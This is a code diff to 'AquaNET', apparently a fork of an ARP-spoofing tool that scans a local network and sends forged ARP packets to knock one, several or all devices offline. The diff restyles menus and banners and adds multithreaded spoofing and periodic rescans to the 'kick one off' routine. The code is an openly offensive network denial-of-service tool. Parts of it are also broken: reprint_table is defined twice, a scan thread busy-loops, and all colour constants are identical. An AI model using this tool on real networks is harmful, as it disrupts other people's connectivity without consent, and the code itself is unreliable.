@@ -1,9 +1,10 @@
+#!/usr/bin/env python
 import os, sys, logging, math, traceback, optparse, threading
 from time import sleep
 
 from scapy.layers.l2 import Ether, ARP
 
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '', '', '', '', '', '', '\033[0m'
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\33[94m', '\033[0m', '\33[94m', '\33[94m', '\33[94m', '\033[0m'
 
 try:
     # check whether user is root
@@ -47,13 +48,11 @@ except:
 # display heading
 def heading():
     spaces = " " * 76
-    sys.stdout.write(GREEN + spaces + """
+    sys.stdout.write(BLUE + spaces + """
 _______  _____  _     _ _______ __   _ _______ _______
 |_____| |   __| |     | |_____| | \  | |______    |   
 |     | |____\| |_____| |     | |  \_| |______    |   
-    """ + END + BLUE)
-
-
+    """ + END)
 # loading animation during network scan
 def scanningAnimation(text):
     try:
@@ -99,15 +98,13 @@ def regenOnlineIPs():
 
 # display options
 def optionBanner():
-    print('\nChoose an option from the menu:\n')
-    sleep(0.2)
-    print('\t{}[{}1{}]{} Kick ONE Off'.format(YELLOW, RED, YELLOW, WHITE))
-    sleep(0.2)
-    print('\t{}[{}2{}]{} Kick SOME Off'.format(YELLOW, RED, YELLOW, WHITE))
-    sleep(0.2)
-    print('\t{}[{}3{}]{} Kick ALL Off'.format(YELLOW, RED, YELLOW, WHITE))
-    sleep(0.2)
-    print('\n\t{}[{}E{}]{} Exit AquaNET\n'.format(YELLOW, RED, YELLOW, WHITE))
+    print('''
+AquaNET Menu:
+  {}[1]{} Kick ONE Off
+  {}[2]{} Kick SOME Off
+  {}[3]{} Kick {}ALL{} Off
+  {}[E]{} Exit AquaNET{}
+    '''.format(BLUE, WHITE, BLUE, WHITE, BLUE, WHITE, BLUE, WHITE, BLUE, WHITE, END))
 
 
 # initiate debugging process
@@ -397,89 +394,7 @@ def nonInteractiveAttack():
         print("{}Re-arped{} target(s) successfully.{}".format(RED, MAGENTA, END))
 
 
-# kick one device
-# def kickoneoff():
-#   os.system("clear||cls")
-#
-#   print("\n{}kickONEOff{} selected...{}\n".format(RED, GREEN, END))
-#   global stopAnimation
-#   stopAnimation = False
-#   t = threading.Thread(target=scanningAnimation, args=('Hang on...',))
-#   t.daemon = True
-#   t.start()
-#
-#   # commence scanning process
-#   try:
-#       scanNetwork()
-#   except KeyboardInterrupt:
-#       shutdown()
-#   stopAnimation = True
-#
-#   print("Online IPs:")
-#   print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
-#   print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))
-#   
-#   for i in range(len(onlineIPs)):
-#       mac = ""
-#       for host in hostsList:
-#           if host[0] == onlineIPs[i]:
-#               mac = host[1]
-#       try:
-#           hostname = socket.gethostbyaddr(onlineIPs[i])[0]
-#       except:
-#           hostname = "N/A"
-#       vendor = resolveMac(mac)
-#       
-#       print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, hostname, END))
-#   canBreak = False
-#   while not canBreak:
-#       try:
-#           choice = int(input("\nChoose a target: "))
-#           oneTargetIP = onlineIPs[choice]
-#           canBreak = True
-#       except KeyboardInterrupt:
-#           shutdown()
-#       except:
-#           print("\n{}ERROR: Please enter a number from the list!{}".format(RED, END))
-#
-#   # locate MAC of specified device
-#   oneTargetMAC = ""
-#   for host in hostsList:
-#       if host[0] == oneTargetIP:
-#           oneTargetMAC = host[1]
-#   if oneTargetMAC == "":
-#       print("\nIP address is not up. Please try again.")
-#       return
-#
-#   print("\n{}Target: {}{}".format(GREEN, END, oneTargetIP))
-#
-#   if options.packets is not None:
-#       print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
-#   else:
-#       print("\n{}Spoofing started... {}".format(GREEN, END))
-#   try:
-#       while True:
-#           # broadcast malicious ARP packets
-#           spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
-#           if options.packets is not None:
-#               time.sleep(1*float(options.packets))
-#           else:
-#               time.sleep(10)
-#   except KeyboardInterrupt:
-#       # re-arp target on KeyboardInterrupt exception
-#       print("\n{}Re-arping{} target...{}".format(RED, GREEN, END))
-#       reArp = 1
-#       while reArp != 10:
-#           try:
-#               # broadcast ARP packets with legitimate info to restore connection
-#               spoof.sendPacket(defaultGatewayMac, defaultGatewayIP, host[0], host[1])
-#           except KeyboardInterrupt:
-#               pass
-#           except:
-#               runDebug()
-#           reArp += 1
-#           time.sleep(0.2)
-#       print("{}Re-arped{} target successfully.{}".format(RED, GREEN, END))
+
 def kickoneoff():
     os.system("clear||cls")
 
@@ -539,20 +454,47 @@ def kickoneoff():
         print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
     else:
         print("\n{}Spoofing started... {}".format(GREEN, END))
+    def periodic_scan_network():
+        global reScan
+        while True:
+            reScan += 1
+            if reScan == 4:
+                reScan = 0
+                scanNetwork()
+
+    # Start the periodic network scanning thread
+    scan_thread = threading.Thread(target=periodic_scan_network)
+    scan_thread.daemon = True
+    scan_thread.start()
+    # try:
+    #     while True:
+    #         def send_spoof_packet():
+    #             # broadcast malicious ARP packets
+    #             spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
+    #             if options.packets is not None:
+    #                 time.sleep(1 * float(options.packets))
+    #             else:
+    #                 time.sleep(10)
+    #
+    #         spoof_thread = threading.Thread(target=send_spoof_packet)
+    #         spoof_thread.daemon = True
+    #         spoof_thread.start()
+    #         spoof_thread.join()
     try:
         while True:
-            def send_spoof_packet():
-                # broadcast malicious ARP packets
-                spoof.sendPacket(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC)
-                if options.packets is not None:
-                    time.sleep(1 * float(options.packets))
-                else:
-                    time.sleep(10)
+            reprint_table()
+            threads = []
+            for host in hostsList:
+                if oneTargetIP != defaultGatewayIP:
+                    # dodge gateway (avoid crashing network itself)
+                    thread = threading.Thread(target=spoof.sendPacket,
+                                              args=(defaultInterfaceMac, defaultGatewayIP, oneTargetIP, oneTargetMAC))
+                    threads.append(thread)
+                    thread.start()
 
-            spoof_thread = threading.Thread(target=send_spoof_packet)
-            spoof_thread.daemon = True
-            spoof_thread.start()
-            spoof_thread.join()
+            # Wait for all threads to finish
+            for thread in threads:
+                thread.join()
     except KeyboardInterrupt:
         # re-arp target on KeyboardInterrupt exception
         print("\n{}Re-arping{} target...{}".format(RED, GREEN, END))
@@ -570,7 +512,6 @@ def kickoneoff():
             print("{}Re-arped{} target successfully.{}".format(RED, GREEN, END))
 
 
-# kick multiple devices
 def kicksomeoff():
     os.system("clear||cls")
 
@@ -666,7 +607,59 @@ def kicksomeoff():
         print("{}Re-arped{} targets successfully.{}".format(RED, GREEN, END))
 
 
-# kick all devices
+
+def clear_console():
+    if sys.platform.startswith('win'):
+        os.system('cls')
+    else:
+        os.system('clear')
+
+def reprint_table(sent):
+    clear_console()
+    print("Target(s): ")
+    print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
+    print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))
+
+    for i in range(len(onlineIPs)):
+        mac = ""
+        for host in hostsList:
+            if host[0] == onlineIPs[i]:
+                mac = host[1]
+
+        vendor = resolveMac(mac)
+
+        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, "N/A", END))
+    if options.packets is not None:
+        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
+    else:
+        print("\n{}Spoofing started... {}".format(GREEN, END))
+
+    print("\nSent: {}".format(sent))  # Display sent variable
+
+
+def reprint_table():
+
+    os.system("clear||cls")
+    print("Target(s): ")
+    print("{:<5} | {:<15} | {:<17} | {:<20}".format("#", "IP Address", "MAC Address", "Device Info"))
+    print("-" * (5 + 1 + 15 + 1 + 17 + 1 + 20 + 1))
+
+    for i in range(len(onlineIPs)):
+        mac = ""
+        for host in hostsList:
+            if host[0] == onlineIPs[i]:
+                mac = host[1]
+
+        vendor = resolveMac(mac)
+
+        print("{:<5} | {:<15} | {:<17} | {} ({}{}){}".format(i, onlineIPs[i], mac, vendor, YELLOW, "N/A", END))
+    if options.packets is not None:
+        print("\n{}Spoofing started... {}( {} pkts/min )".format(GREEN, END, str(options.packets)))
+    else:
+        print("\n{}Spoofing started... {}".format(GREEN, END))
+
+    print("\nSent: {}".format(spoof.sent))  # Display sent variable
+
 def kickalloff():
     os.system("clear||cls")
 
@@ -717,6 +710,7 @@ def kickalloff():
 
     try:
         while True:
+            reprint_table()
             threads = []
             for host in hostsList:
                 if host[0] != defaultGatewayIP:
@@ -755,10 +749,14 @@ def main():
 
     if interactive:
 
-        print(
-            "\n{}Using interface '{}{}{}' with MAC address '{}{}{}'.\nGateway IP: '{}{}{}' --> {}{}{} hosts are up.{}".format(
-                GREEN, RED, defaultInterface, GREEN, RED, defaultInterfaceMac, GREEN, RED, defaultGatewayIP, GREEN, RED,
-                str(len(hostsList)), GREEN, END))
+        print('''
+----------------------------------
+  Network Interface: {}
+  MAC Address: {}
+  Gateway IP: {}
+  Hosts Online: {}
+----------------------------------
+        '''.format(defaultInterface, defaultInterfaceMac, defaultGatewayIP, str(len(hostsList))))
         # display warning in case of no active hosts
         if len(hostsList) == 0 or len(hostsList) == 1:
             if len(hostsList) == 1:
@@ -788,7 +786,7 @@ def main():
             while True:
                 optionBanner()
 
-                header = ('{}AquaNET{}> {}'.format(BLUE, WHITE, END))
+                header = ('{}AquaNET{}>{}'.format(BLUE, WHITE, END))
                 choice = input(header)
 
                 if choice.upper() == 'E' or choice.upper() == 'EXIT':
